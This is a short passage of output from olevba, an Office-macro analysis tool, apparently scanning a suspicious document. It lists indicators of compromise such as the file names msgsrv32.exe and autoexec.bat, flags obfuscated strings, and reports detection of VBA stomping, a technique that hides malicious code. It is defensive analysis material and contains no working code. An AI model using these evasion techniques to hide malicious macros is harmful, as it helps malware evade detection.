|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msgsrv32.exe        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

